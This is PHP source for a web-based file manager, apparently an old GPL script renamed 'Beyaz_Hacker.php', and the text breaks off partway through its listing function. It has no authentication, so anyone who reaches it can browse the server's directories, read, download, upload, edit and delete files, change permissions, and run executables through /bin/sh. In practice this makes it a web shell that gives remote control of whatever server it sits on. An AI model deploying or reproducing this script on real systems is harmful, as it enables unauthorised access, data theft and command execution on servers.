<?php
/*
 * Beyaz_Hacker.php - a simple Web-based file manager
 * Copyright (C) 2004  Daniel Wacker <daniel.wacker@web.de>
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.

 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.
 *
 * -------------------------------------------------------------------------
 * While using this script, do NOT navigate with your browser's back and
 * forward buttons! Always open files in a new browser tab!
 * -------------------------------------------------------------------------
 *
 * This is Version 0.9, revision 10
 * =========================================================================
 *
 * Changes of revision 10
 * <alex-smirnov@web.de>
 *    added Russian translation
 * <daniel.wacker@web.de>
 *    added </td> to achieve valid XHTML (thanks to Marc Magos)
 *    improved delete function
 * <ava@asl.se>
 *    new list order: folders first
 *
 * Changes of revision 9
 * <daniel.wacker@web.de>
 *    added workaround for directory listing, if lstat() is disabled
 *    fixed permisson of uploaded files (thanks to Stephan Duffner)
 *
 * Changes of revision 8
 * <okankan@stud.sdu.edu.tr>
 *    added Turkish translation
 * <j@kub.cz>
 *    added Czech translation
 * <daniel.wacker@web.de>
 *    improved charset handling
 *
 * Changes of revision 7
 * <szuniga@vtr.net>
 *    added Spanish translation
 * <lars@soelgaard.net>
 *    added Danish translation
 * <daniel.wacker@web.de>
 *    improved rename dialog
 *
 * Changes of revision 6
 * <nederkoorn@tiscali.nl>
 *    added Dutch translation
 *
 * Changes of revision 5
 * <daniel.wacker@web.de>
 *    added language auto select
 *    fixed symlinks in directory listing
 *    removed word-wrap in edit textarea
 *
 * Changes of revision 4
 * <daloan@guideo.fr>
 *    added French translation
 * <anders@wiik.cc>
 *    added Swedish translation
 *
 * Changes of revision 3
 * <nzunta@gabriele-erba.it>
 *    improved Italian translation
 *
 * Changes of revision 2
 * <daniel.wacker@web.de>
 *    got images work in some old browsers
 *    fixed creation of directories
 *    fixed files deletion
 *    improved path handling
 *    added missing word 'not_created'
 * <till@tuxen.de>
 *    improved human readability of file sizes
 * <nzunta@gabriele-erba.it>
 *    added Italian translation
 *
 * Changes of revision 1
 * <daniel.wacker@web.de>
 *    Beyaz_Hacker.php completely rewritten:
 *    - clean XHTML/CSS output
 *    - several files selectable
 *    - support for windows servers
 *    - no more treeview, because
 *      - Beyaz_Hacker.php is a >simple< file manager
 *      - performance problems (too much additional code)
 *      - I don't like: frames, java-script, to reload after every treeview-click
 *    - execution of shell scripts
 *    - introduced revision numbers
 *
/* ------------------------------------------------------------------------- */

/* Your language:
 * 'en' - English
 * 'de' - German
 * 'fr' - French
 * 'it' - Italian
 * 'nl' - Dutch
 * 'se' - Swedish
 * 'es' - Spanish
 * 'dk' - Danish
 * 'tr' - Turkish
 * 'cs' - Czech
 * 'ru' - Russian
 * 'auto' - autoselect
 */
$lang = 'auto';

/* Charset of output:
 * possible values are described in the charset table at
 * http://www.php.net/manual/en/function.htmlentities.php
 * 'auto' - use the same charset as the words of my language are encoded
 */
$site_charset = 'auto';

/* Homedir:
 * For example: './' - the script's directory
 */
$homedir = './';

/* Size of the edit textarea
 */
$editcols = 80;
$editrows = 25;

/* -------------------------------------------
 * Optional configuration (remove # to enable)
 */

/* Permission of created directories:
 * For example: 0705 would be 'drwx---r-x'.
 */
# $dirpermission = 0705;

/* Permission of created files:
 * For example: 0604 would be '-rw----r--'.
 */
# $filepermission = 0604;

/* Filenames related to the apache web server:
 */
$htaccess = '.htaccess';
$htpasswd = '.htpasswd';

/* ------------------------------------------------------------------------- */

if (get_magic_quotes_gpc()) {
	array_walk($_GET, 'strip');
	array_walk($_POST, 'strip');
	array_walk($_REQUEST, 'strip');
}

if (array_key_exists('image', $_GET)) {
	header('Content-Type: image/gif');
	die(getimage($_GET['image']));
}

if (!function_exists('lstat')) {
	function lstat ($filename) {
		return stat($filename);
	}
}

$delim = DIRECTORY_SEPARATOR;

if (function_exists('php_uname')) {
	$win = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') ? true : false;
} else {
	$win = ($delim == '\\') ? true : false;
}

if (!empty($_SERVER['PATH_TRANSLATED'])) {
	$scriptdir = dirname($_SERVER['PATH_TRANSLATED']);
} elseif (!empty($_SERVER['SCRIPT_FILENAME'])) {
	$scriptdir = dirname($_SERVER['SCRIPT_FILENAME']);
} elseif (function_exists('getcwd')) {
	$scriptdir = getcwd();
} else {
	$scriptdir = '.';
}
$homedir = relative2absolute($homedir, $scriptdir);

$dir = (array_key_exists('dir', $_REQUEST)) ? $_REQUEST['dir'] : $homedir;

if (array_key_exists('olddir', $_POST) && !path_is_relative($_POST['olddir'])) {
	$dir = relative2absolute($dir, $_POST['olddir']);
}

$directory = simplify_path(addslash($dir));

$files = array();
$action = '';
if (!empty($_POST['submit_all'])) {
	$action = $_POST['action_all'];
	for ($i = 0; $i < $_POST['num']; $i++) {
		if (array_key_exists("checked$i", $_POST) && $_POST["checked$i"] == 'true') {
			$files[] = $_POST["file$i"];
		}
	}
} elseif (!empty($_REQUEST['action'])) {
	$action = $_REQUEST['action'];
	$files[] = relative2absolute($_REQUEST['file'], $directory);
} elseif (!empty($_POST['submit_upload']) && !empty($_FILES['upload']['name'])) {
	$files[] = $_FILES['upload'];
	$action = 'upload';
} elseif (array_key_exists('num', $_POST)) {
	for ($i = 0; $i < $_POST['num']; $i++) {
		if (array_key_exists("submit$i", $_POST)) break;
	}
	if ($i < $_POST['num']) {
		$action = $_POST["action$i"];
		$files[] = $_POST["file$i"];
	}
}
if (empty($action) && (!empty($_POST['submit_create']) || (array_key_exists('focus', $_POST) && $_POST['focus'] == 'create')) && !empty($_POST['create_name'])) {
	$files[] = relative2absolute($_POST['create_name'], $directory);
	switch ($_POST['create_type']) {
	case 'directory':
		$action = 'create_directory';
		break;
	case 'file':
		$action = 'create_file';
	}
}
if (sizeof($files) == 0) $action = ''; else $file = reset($files);

if ($lang == 'auto') {
	if (array_key_exists('HTTP_ACCEPT_LANGUAGE', $_SERVER) && strlen($_SERVER['HTTP_ACCEPT_LANGUAGE']) >= 2) {
		$lang = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);
	} else {
		$lang = 'en';
	}
}

$words = getwords($lang);

if ($site_charset == 'auto') {
	$site_charset = $word_charset;
}

$cols = ($win) ? 4 : 7;

if (!isset($dirpermission)) {
	$dirpermission = (function_exists('umask')) ? (0777 & ~umask()) : 0755;
}
if (!isset($filepermission)) {
	$filepermission = (function_exists('umask')) ? (0666 & ~umask()) : 0644;
}

if (!empty($_SERVER['SCRIPT_NAME'])) {
	$self = html(basename($_SERVER['SCRIPT_NAME']));
} elseif (!empty($_SERVER['PHP_SELF'])) {
	$self = html(basename($_SERVER['PHP_SELF']));
} else {
	$self = '';
}

if (!empty($_SERVER['SERVER_SOFTWARE'])) {
	if (strtolower(substr($_SERVER['SERVER_SOFTWARE'], 0, 6)) == 'apache') {
		$apache = true;
	} else {
		$apache = false;
	}
} else {
	$apache = true;
}

switch ($action) {

case 'view':

	if (is_script($file)) {

		/* highlight_file is a mess! */
		ob_start();
		highlight_file($file);
		$src = ereg_replace('<font color="([^"]*)">', '<span style="color: \1">', ob_get_contents());
		$src = str_replace(array('</font>', "\r", "\n"), array('</span>', '', ''), $src);
		ob_end_clean();

		html_header();
		echo '<h2 style="text-align: left; margin-bottom: 0">' . html($file) . '</h2>

<hr />

<table>
<tr>
<td style="text-align: right; vertical-align: top; color: gray; padding-right: 3pt; border-right: 1px solid gray">
<pre style="margin-top: 0"><code>';

		for ($i = 1; $i <= sizeof(file($file)); $i++) echo "$i\n";

		echo '</code></pre>
</td>
<td style="text-align: left; vertical-align: top; padding-left: 3pt">
<pre style="margin-top: 0">' . $src . '</pre>
</td>
</tr>
</table>

';

		html_footer();

	} else {

		header('Content-Type: ' . getmimetype($file));
		header('Content-Disposition: filename=' . basename($file));

		readfile($file);

	}

	break;

case 'download':

	header('Pragma: public');
	header('Expires: 0');
	header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
	header('Content-Type: ' . getmimetype($file));
	header('Content-Disposition: attachment; filename=' . basename($file) . ';');
	header('Content-Length: ' . filesize($file));

	readfile($file);

	break;

case 'upload':

	$dest = relative2absolute($file['name'], $directory);

	if (@file_exists($dest)) {
		listing_page(error('already_exists', $dest));
	} elseif (@move_uploaded_file($file['tmp_name'], $dest)) {
		@chmod($dest, $filepermission);
		listing_page(notice('uploaded', $file['name']));
	} else {
		listing_page(error('not_uploaded', $file['name']));
	}

	break;

case 'create_directory':

	if (@file_exists($file)) {
		listing_page(error('already_exists', $file));
	} else {
		$old = @umask(0777 & ~$dirpermission);
		if (@mkdir($file, $dirpermission)) {
			listing_page(notice('created', $file));
		} else {
			listing_page(error('not_created', $file));
		}
		@umask($old);
	}

	break;

case 'create_file':

	if (@file_exists($file)) {
		listing_page(error('already_exists', $file));
	} else {
		$old = @umask(0777 & ~$filepermission);
		if (@touch($file)) {
			edit($file);
		} else {
			listing_page(error('not_created', $file));
		}
		@umask($old);
	}

	break;

case 'execute':

	chdir(dirname($file));

	$output = array();
	$retval = 0;
	exec('echo "./' . basename($file) . '" | /bin/sh', $output, $retval);

	$error = ($retval == 0) ? false : true;

	if (sizeof($output) == 0) $output = array('<' . $words['no_output'] . '>');

	if ($error) {
		listing_page(error('not_executed', $file, implode("\n", $output)));
	} else {
		listing_page(notice('executed', $file, implode("\n", $output)));
	}

	break;

case 'delete':

	if (!empty($_POST['no'])) {
		listing_page();
	} elseif (!empty($_POST['yes'])) {

		$failure = array();
		$success = array();

		foreach ($files as $file) {
			if (del($file)) {
				$success[] = $file;
			} else {
				$failure[] = $file;
			}
		}

		$message = '';
		if (sizeof($failure) > 0) {
			$message = error('not_deleted', implode("\n", $failure));
		}
		if (sizeof($success) > 0) {
			$message .= notice('deleted', implode("\n", $success));
		}

		listing_page($message);

	} else {

		html_header();

		echo '<form action="' . $self . '" method="post">
<table class="dialog">
<tr>
<td class="dialog">
';

		request_dump();

		echo "\t<b>" . word('really_delete') . '</b>
	<p>
';

		foreach ($files as $file) {
			echo "\t" . html($file) . "<br />\n";
		}

		echo '	</p>
	<hr />
	<input type="submit" name="no" value="' . word('no') . '" id="red_button" />
	<input type="submit" name="yes" value="' . word('yes') . '" id="green_button" style="margin-left: 50px" />
</td>
</tr>
</table>
</form>

';

		html_footer();

	}

	break;

case 'rename':

	if (!empty($_POST['destination'])) {

		$dest = relative2absolute($_POST['destination'], $directory);

		if (!@file_exists($dest) && @rename($file, $dest)) {
			listing_page(notice('renamed', $file, $dest));
		} else {
			listing_page(error('not_renamed', $file, $dest));
		}

	} else {

		$name = basename($file);

		html_header();

		echo '<form action="' . $self . '" method="post">

<table class="dialog">
<tr>
<td class="dialog">
	<input type="hidden" name="action" value="rename" />
	<input type="hidden" name="file" value="' . html($file) . '" />
	<input type="hidden" name="dir" value="' . html($directory) . '" />
	<b>' . word('rename_file') . '</b>
	<p>' . html($file) . '</p>
	<b>' . substr($file, 0, strlen($file) - strlen($name)) . '</b>
	<input type="text" name="destination" size="' . textfieldsize($name) . '" value="' . html($name) . '" />
	<hr />
	<input type="submit" value="' . word('rename') . '" />
</td>
</tr>
</table>

<p><a href="' . $self . '?dir=' . urlencode($directory) . '">[ ' . word('back') . ' ]</a></p>

</form>

';

		html_footer();

	}

	break;

case 'move':

	if (!empty($_POST['destination'])) {

		$dest = relative2absolute($_POST['destination'], $directory);

		$failure = array();
		$success = array();

		foreach ($files as $file) {
			$filename = substr($file, strlen($directory));
			$d = $dest . $filename;
			if (!@file_exists($d) && @rename($file, $d)) {
				$success[] = $file;
			} else {
				$failure[] = $file;
			}
		}

		$message = '';
		if (sizeof($failure) > 0) {
			$message = error('not_moved', implode("\n", $failure), $dest);
		}
		if (sizeof($success) > 0) {
			$message .= notice('moved', implode("\n", $success), $dest);
		}

		listing_page($message);

	} else {

		html_header();

		echo '<form action="' . $self . '" method="post">

<table class="dialog">
<tr>
<td class="dialog">
';

		request_dump();

		echo "\t<b>" . word('move_files') . '</b>
	<p>
';

		foreach ($files as $file) {
			echo "\t" . html($file) . "<br />\n";
		}

		echo '	</p>
	<hr />
	' . word('destination') . ':
	<input type="text" name="destination" size="' . textfieldsize($directory) . '" value="' . html($directory) . '" />
	<input type="submit" value="' . word('move') . '" />
</td>
</tr>
</table>

<p><a href="' . $self . '?dir=' . urlencode($directory) . '">[ ' . word('back') . ' ]</a></p>

</form>

';

		html_footer();

	}

	break;

case 'copy':

	if (!empty($_POST['destination'])) {

		$dest = relative2absolute($_POST['destination'], $directory);

		if (@is_dir($dest)) {

			$failure = array();
			$success = array();

			foreach ($files as $file) {
				$filename = substr($file, strlen($directory));
				$d = addslash($dest) . $filename;
				if (!@is_dir($file) && !@file_exists($d) && @copy($file, $d)) {
					$success[] = $file;
				} else {
					$failure[] = $file;
				}
			}

			$message = '';
			if (sizeof($failure) > 0) {
				$message = error('not_copied', implode("\n", $failure), $dest);
			}
			if (sizeof($success) > 0) {
				$message .= notice('copied', implode("\n", $success), $dest);
			}

			listing_page($message);

		} else {

			if (!@file_exists($dest) && @copy($file, $dest)) {
				listing_page(notice('copied', $file, $dest));
			} else {
				listing_page(error('not_copied', $file, $dest));
			}

		}

	} else {

		html_header();

		echo '<form action="' . $self . '" method="post">

<table class="dialog">
<tr>
<td class="dialog">
';

		request_dump();

		echo "\n<b>" . word('copy_files') . '</b>
	<p>
';

		foreach ($files as $file) {
			echo "\t" . html($file) . "<br />\n";
		}

		echo '	</p>
	<hr />
	' . word('destination') . ':
	<input type="text" name="destination" size="' . textfieldsize($directory) . '" value="' . html($directory) . '" />
	<input type="submit" value="' . word('copy') . '" />
</td>
</tr>
</table>

<p><a href="' . $self . '?dir=' . urlencode($directory) . '">[ ' . word('back') . ' ]</a></p>

</form>

';

		html_footer();

	}

	break;

case 'create_symlink':

	if (!empty($_POST['destination'])) {

		$dest = relative2absolute($_POST['destination'], $directory);

		if (substr($dest, -1, 1) == $delim) $dest .= basename($file);

		if (!empty($_POST['relative'])) $file = absolute2relative(addslash(dirname($dest)), $file);

		if (!@file_exists($dest) && @symlink($file, $dest)) {
			listing_page(notice('symlinked', $file, $dest));
		} else {
			listing_page(error('not_symlinked', $file, $dest));
		}

	} else {

		html_header();

		echo '<form action="' . $self . '" method="post">

<table class="dialog" id="symlink">
<tr>
	<td style="vertical-align: top">' . word('destination') . ': </td>
	<td>
		<b>' . html($file) . '</b><br />
		<input type="checkbox" name="relative" value="yes" id="checkbox_relative" checked="checked" style="margin-top: 1ex" />
		<label for="checkbox_relative">' . word('relative') . '</label>
		<input type="hidden" name="action" value="create_symlink" />
		<input type="hidden" name="file" value="' . html($file) . '" />
		<input type="hidden" name="dir" value="' . html($directory) . '" />
	</td>
</tr>
<tr>
	<td>' . word('symlink') . ': </td>
	<td>
		<input type="text" name="destination" size="' . textfieldsize($directory) . '" value="' . html($directory) . '" />
		<input type="submit" value="' . word('create_symlink') . '" />
	</td>
</tr>
</table>

<p><a href="' . $self . '?dir=' . urlencode($directory) . '">[ ' . word('back') . ' ]</a></p>

</form>

';

		html_footer();

	}

	break;

case 'edit':

	if (!empty($_POST['save'])) {

		$content = str_replace("\r\n", "\n", $_POST['content']);

		if (($f = @fopen($file, 'w')) && @fwrite($f, $content) !== false && @fclose($f)) {
			listing_page(notice('saved', $file));
		} else {
			listing_page(error('not_saved', $file));
		}

	} else {

		if (@is_readable($file) && @is_writable($file)) {
			edit($file);
		} else {
			listing_page(error('not_edited', $file));
		}

	}

	break;

case 'permission':

	if (!empty($_POST['set'])) {

		$mode = 0;
		if (!empty($_POST['ur'])) $mode |= 0400; if (!empty($_POST['uw'])) $mode |= 0200; if (!empty($_POST['ux'])) $mode |= 0100;
		if (!empty($_POST['gr'])) $mode |= 0040; if (!empty($_POST['gw'])) $mode |= 0020; if (!empty($_POST['gx'])) $mode |= 0010;
		if (!empty($_POST['or'])) $mode |= 0004; if (!empty($_POST['ow'])) $mode |= 0002; if (!empty($_POST['ox'])) $mode |= 0001;

		if (@chmod($file, $mode)) {
			listing_page(notice('permission_set', $file, decoct($mode)));
		} else {
			listing_page(error('permission_not_set', $file, decoct($mode)));
		}

	} else {

		html_header();

		$mode = fileperms($file);

		echo '<form action="' . $self . '" method="post">

<table class="dialog">
<tr>
<td class="dialog">

	<p style="margin: 0">' . phrase('permission_for', $file) . '</p>

	<hr />

	<table id="permission">
	<tr>
		<td></td>
		<td style="border-right: 1px solid black">' . word('owner') . '</td>
		<td style="border-right: 1px solid black">' . word('group') . '</td>
		<td>' . word('other') . '</td>
	</tr>
    
	<tr>
		<td style="text-align: right">' . word('read') . ':</td>
		<td><input type="checkbox" name="ur" value="1"'; if ($mode & 00400) echo ' checked="checked"'; echo ' /></td>
		<td><input type="checkbox" name="gr" value="1"'; if ($mode & 00040) echo ' checked="checked"'; echo ' /></td>
		<td><input type="checkbox" name="or" value="1"'; if ($mode & 00004) echo ' checked="checked"'; echo ' /></td>
	</tr>
	<tr>
		<td style="text-align: right">' . word('write') . ':</td>
		<td><input type="checkbox" name="uw" value="1"'; if ($mode & 00200) echo ' checked="checked"'; echo ' /></td>
		<td><input type="checkbox" name="gw" value="1"'; if ($mode & 00020) echo ' checked="checked"'; echo ' /></td>
		<td><input type="checkbox" name="ow" value="1"'; if ($mode & 00002) echo ' checked="checked"'; echo ' /></td>
	</tr>
	<tr>
		<td style="text-align: right">' . word('execute') . ':</td>
		<td><input type="checkbox" name="ux" value="1"'; if ($mode & 00100) echo ' checked="checked"'; echo ' /></td>
		<td><input type="checkbox" name="gx" value="1"'; if ($mode & 00010) echo ' checked="checked"'; echo ' /></td>
		<td><input type="checkbox" name="ox" value="1"'; if ($mode & 00001) echo ' checked="checked"'; echo ' /></td>
	</tr>
	</table>

	<hr />

	<input type="submit" name="set" value="' . word('set') . '" />

	<input type="hidden" name="action" value="permission" />
	<input type="hidden" name="file" value="' . html($file) . '" />
	<input type="hidden" name="dir" value="' . html($directory) . '" />

</td>
</tr>
</table>

<p><a href="' . $self . '?dir=' . urlencode($directory) . '">[ ' . word('back') . ' ]</a></p>

</form>

';

		html_footer();

	}

	break;

default:

	listing_page();

}

/* ------------------------------------------------------------------------- */

function getlist ($directory) {
	global $delim, $win;

	if ($d = @opendir($directory)) {

		while (($filename = @readdir($d)) !== false) {

			$path = $directory . $filename;

			if ($stat = @lstat($path)) {

				$file = array(
					'filename'    => $filename,
					'path'        => $path,
					'is_file'     => @is_file($path),
					'is_dir'      => @is_dir($path),
					'is_link'     => @is_link($path),
					'is_readable' => @is_readable($path),
					'is_writable' => @is_writable($path),
					'size'        => $stat['size'],
					'permission'  => $stat['mode'],
					'owner'       => $stat['uid'],
					'group'       => $stat['gid'],
					'mtime'       => @filemtime($path),
					'atime'       => @fileatime($path),
					'ctime'       => @filectime($path)
				);

				if ($file['is_dir']) {
					$file['is_executable'] = @file_exists($path . $delim . '.');
				} else {
					if (!$win) {
						$file['is_executable'] = @is_executable($path);
					} else {
						$file['is_executable'] = true;
					}
				}

				if ($file['is_link']) $file['target'] = @readlink($path);

				if (function_exists('posix_getpwuid')) $file['owner_name'] = @reset(posix_getpwuid($file['owner']));
				if (function_exists('posix_getgrgid')) $file['group_name'] = @reset(posix_getgrgid($file['group']));

				$files[] = $file;

			}

		}

		return $files;

	} else {
		return false;
	}

}

function sortlist ($list, $key, $reverse) {

	$dirs = array();
	$files = array();
	
	for ($i = 0; $i < sizeof($list); $i++) {
		if ($list[$i]['is_dir']) $dirs[] = $list[$i];
		else $files[] = $list[$i];
	}

	quicksort($dirs, 0, sizeof($dirs) - 1, $key);
	if ($reverse) $dirs = array_reverse($dirs);

	quicksort($files, 0, sizeof($files) - 1, $key);
	if ($reverse) $files = array_reverse($files);

	return array_merge($dirs, $files);

}

function quicksort (&$array, $first, $last, $key) {

	if ($first < $last) {

		$cmp = $array[floor(($first + $last) / 2)][$key];

		$l = $first;
		$r = $last;

		while ($l <= $r) {

			while ($array[$l][$key] < $cmp) $l++;
			while ($array[$r][$key] > $cmp) $r--;

			if ($l <= $r) {

				$tmp = $array[$l];
				$array[$l] = $array[$r];
				$array[$r] = $tmp;

				$l++;
				$r--;

			}

		}

		quicksort($array, $first, $r, $key);
		quicksort($array, $l, $last, $key);

	}

}

function permission_octal2string ($mode) {

	if (($mode & 0xC000) === 0xC000) {
		$type = 's';
	} elseif (($mode & 0xA000) === 0xA000) {
		$type = 'l';
	} elseif (($mode & 0x8000) === 0x8000) {
		$type = '-';
	} elseif (($mode & 0x6000) === 0x6000) {
		$type = 'b';
	} elseif (($mode & 0x4000) === 0x4000) {
		$type = 'd';
	} elseif (($mode & 0x2000) === 0x2000) {
		$type = 'c';
	} elseif (($mode & 0x1000) === 0x1000) {
		$type = 'p';
	} else {
		$type = '?';
	}

	$owner  = ($mode & 00400) ? 'r' : '-';
	$owner .= ($mode & 00200) ? 'w' : '-';
	if ($mode & 0x800) {
		$owner .= ($mode & 00100) ? 's' : 'S';
	} else {
		$owner .= ($mode & 00100) ? 'x' : '-';
	}

	$group  = ($mode & 00040) ? 'r' : '-';
	$group .= ($mode & 00020) ? 'w' : '-';
	if ($mode & 0x400) {
		$group .= ($mode & 00010) ? 's' : 'S';
	} else {
		$group .= ($mode & 00010) ? 'x' : '-';
	}

	$other  = ($mode & 00004) ? 'r' : '-';
	$other .= ($mode & 00002) ? 'w' : '-';
	if ($mode & 0x200) {
		$other .= ($mode & 00001) ? 't' : 'T';
	} else {
		$other .= ($mode & 00001) ? 'x' : '-';
	}

	return $type . $owner . $group . $other;

}

function is_script ($filename) {
	return ereg('\.php$|\.php3$|\.php4$|\.php5$', $filename);
}

function getmimetype ($filename) {
	static $mimes = array(
		'\.jpg$|\.jpeg$'  => 'image/jpeg',
		'\.gif$'          => 'image/gif',
		'\.png$'          => 'image/png',
		'\.html$|\.html$' => 'text/html',
		'\.txt$|\.asc$'   => 'text/plain',
		'\.xml$|\.xsl$'   => 'application/xml',
		'\.pdf$'          => 'application/pdf'
	);

	foreach ($mimes as $regex => $mime) {
		if (eregi($regex, $filename)) return $mime;
	}

	// return 'application/octet-stream';
	return 'text/plain';

}

function del ($file) {
	global $delim;

	if (!file_exists($file)) return false;

	if (@is_dir($file) && !@is_link($file)) {

		$success = false;

		if (@rmdir($file)) {

			$success = true;

		} elseif ($dir = @opendir($file)) {

			$success = true;

			while (($f = readdir($dir)) !== false) {
				if ($f != '.' && $f != '..' && !del($file . $delim . $f)) {
					$success = false;
				}
			}
			closedir($dir);

			if ($success) $success = @rmdir($file);

		}

		return $success;

	}

	return @unlink($file);

}

function addslash ($directory) {
	global $delim;

	if (substr($directory, -1, 1) != $delim) {
		return $directory . $delim;
	} else {
		return $directory;
	}

}

function relative2absolute ($string, $directory) {

	if (path_is_relative($string)) {
		return simplify_path(addslash($directory) . $string);
	} else {
		return simplify_path($string);
	}

}

function path_is_relative ($path) {
	global $win;

	if ($win) {
		return (substr($path, 1, 1) != ':');
	} else {
		return (substr($path, 0, 1) != '/');
	}

}

function absolute2relative ($directory, $target) {
	global $delim;

	$path = '';
	while ($directory != $target) {
		if ($directory == substr($target, 0, strlen($directory))) {
			$path .= substr($target, strlen($directory));
			break;
		} else {
			$path .= '..' . $delim;
			$directory = substr($directory, 0, strrpos(substr($directory, 0, -1), $delim) + 1);
		}
	}
	if ($path == '') $path = '.';

	return $path;

}

function simplify_path ($path) {
	global $delim;

	if (@file_exists($path) && function_exists('realpath') && @realpath($path) != '') {
		$path = realpath($path);
		if (@is_dir($path)) {
			return addslash($path);
		} else {
			return $path;
		}
	}

	$pattern  = $delim . '.' . $delim;

	if (@is_dir($path)) {
		$path = addslash($path);
	}

	while (strpos($path, $pattern) !== false) {
		$path = str_replace($pattern, $delim, $path);
	}

	$e = addslashes($delim);
	$regex = $e . '((\.[^\.' . $e . '][^' . $e . ']*)|(\.\.[^' . $e . ']+)|([^\.][^' . $e . ']*))' . $e . '\.\.' . $e;

	while (ereg($regex, $path)) {
		$path = ereg_replace($regex, $delim, $path);
	}
	
	return $path;

}

function human_filesize ($filesize) {

	$suffices = 'kMGTPE';

	$n = 0;
	while ($filesize >= 1000) {
		$filesize /= 1024;
		$n++;
	}

	$filesize = round($filesize, 3 - strpos($filesize, '.'));

	if (strpos($filesize, '.') !== false) {
		while (in_array(substr($filesize, -1, 1), array('0', '.'))) {
			$filesize = substr($filesize, 0, strlen($filesize) - 1);
		}
	}

	$suffix = (($n == 0) ? '' : substr($suffices, $n - 1, 1));

	return $filesize . " {$suffix}B";

}

function strip (&$str) {
	$str = stripslashes($str);
}

/* ------------------------------------------------------------------------- */

function listing_page ($message = null) {
	global $self, $directory, $sort, $reverse;

	html_header();

	$list = getlist($directory);

	if (array_key_exists('sort', $_GET)) $sort = $_GET['sort']; else $sort = 'filename';
	if (array_key_exists('reverse', $_GET) && $_GET['reverse'] == 'true') $reverse = true; else $reverse = false;

	$list = sortlist($list, $sort, $reverse);

	echo '<h1 style="margin-bottom: 0">Beyaz_Hacker.php</h1>

<form enctype="multipart/form-data" action="' . $self . '" method="post">

<table id="main">
';

	directory_choice();

	if (!empty($message)) {
		spacer();
		echo $message;
	}

	if (@is_writable($directory)) {
		upload_box();
		create_box();
	} else {
		spacer();
	}

	if ($list) {
		listing($list);
	} else {
		echo error('not_readable', $directory);
	}

	echo '</table>

</form>

';

	html_footer();

}

function listing ($list) {
	global $directory, $homedir, $sort, $reverse, $win, $cols, $date_format, $self;

	echo '<tr class="listing">
	<th style="text-align: center; vertical-align: middle"><img src="' . $self . '?image=smiley" alt="smiley" /></th>
';

	column_title('filename', $sort, $reverse);
	column_title('size', $sort, $reverse);

	if (!$win) {
		column_title('permission', $sort, $reverse);
		column_title('owner', $sort, $reverse);
		column_title('group', $sort, $reverse);
	}

	echo '	<th class="functions">' . word('functions') . '</th>
</tr>
';

	for ($i = 0; $i < sizeof($list); $i++) {
		$file = $list[$i];

		$timestamps  = 'mtime: ' . date($date_format, $file['mtime']) . ', ';
		$timestamps .= 'atime: ' . date($date_format, $file['atime']) . ', ';
		$timestamps .= 'ctime: ' . date($date_format, $file['ctime']);

		echo '<tr class="listing">
	<td class="checkbox"><input type="checkbox" name="checked' . $i . '" value="true" onfocus="activate(\'other\')" /></td>
	<td class="filename" title="' . html($timestamps) . '">';

		if ($file['is_link']) {

			echo '<img src="' . $self . '?image=link" alt="link" /> ';
			echo html($file['filename']) . ' &rarr; ';

			$real_file = relative2absolute($file['target'], $directory);

			if (@is_readable($real_file)) {
				if (@is_dir($real_file)) {
					echo '[ <a href="' . $self . '?dir=' . urlencode($real_file) . '">' . html($file['target']) . '</a> ]';
				} else {
					echo '<a href="' . $self . '?action=view&amp;file=' . urlencode($real_file) . '">' . html($file['target']) . '</a>';
				}
			} else {
				echo html($file['target']);
			}

		} elseif ($file['is_dir']) {

			echo '<img src="' . $self . '?image=folder" alt="folder" /> [ ';
			if ($win || $file['is_executable']) {
				echo '<a href="' . $self . '?dir=' . urlencode($file['path']) . '">' . html($file['filename']) . '</a>';
			} else {
				echo html($file['filename']);
			}
			echo ' ]';

		} else {

			if (substr($file['filename'], 0, 1) == '.') {
				echo '<img src="' . $self . '?image=hidden_file" alt="hidden file" /> ';
			} else {
				echo '<img src="' . $self . '?image=file" alt="file" /> ';
			}

			if ($file['is_file'] && $file['is_readable']) {
			   echo '<a href="' . $self . '?action=view&amp;file=' . urlencode($file['path']) . '">' . html($file['filename']) . '</a>';
			} else {
				echo html($file['filename']);
			}

		}

		if ($file['size'] >= 1000) {
			$human = ' title="' . human_filesize($file['size']) . '"';
		} else {
			$human = '';
		}

		echo "</td>\n";

		echo "\t<td class=\"size\"$human>{$file['size']} B</td>\n";

		if (!$win) {

			echo "\t<td class=\"permission\" title=\"" . decoct($file['permission']) . '">';

			$l = !$file['is_link'] && (!function_exists('posix_getuid') || $file['owner'] == posix_getuid());
			if ($l) echo '<a href="' . $self . '?action=permission&amp;file=' . urlencode($file['path']) . '&amp;dir=' . urlencode($directory) . '">';
			echo html(permission_octal2string($file['permission']));
			if ($l) echo '</a>';

			echo "</td>\n";

			if (array_key_exists('owner_name', $file)) {
				echo "\t<td class=\"owner\" title=\"uid: {$file['owner']}\">{$file['owner_name']}</td>\n";
			} else {
				echo "\t<td class=\"owner\">{$file['owner']}</td>\n";
			}

			if (array_key_exists('group_name', $file)) {
				echo "\t<td class=\"group\" title=\"gid: {$file['group']}\">{$file['group_name']}</td>\n";
			} else {
				echo "\t<td class=\"group\">{$file['group']}</td>\n";
			}

		}

		echo '	<td class="functions">
		<input type="hidden" name="file' . $i . '" value="' . html($file['path']) . '" />
';

		$actions = array();
		if (function_exists('symlink')) {
			$actions[] = 'create_symlink';
		}
		if (@is_writable(dirname($file['path']))) {
			$actions[] = 'delete';
			$actions[] = 'rename';
			$actions[] = 'move';
		}
		if ($file['is_file'] && $file['is_readable']) {
			$actions[] = 'copy';
			$actions[] = 'download';
			if ($file['is_writable']) $actions[] = 'edit';
		}
		if (!$win && function_exists('exec') && $file['is_file'] && $file['is_executable'] && file_exists('/bin/sh')) {
			$actions[] = 'execute';
		}

		if (sizeof($actions) > 0) {

			echo '		<select class="small" name="action' . $i . '" size="1">
		<option value="">' . str_repeat('&nbsp;', 30) . '</option>
';

			foreach ($actions as $action) {
				echo "\t\t<option value=\"$action\">" . word($action) . "</option>\n";
			}

			echo '		</select>
		<input class="small" type="submit" name="submit' . $i . '" value=" &gt; " onfocus="activate(\'other\')" />
';

		}

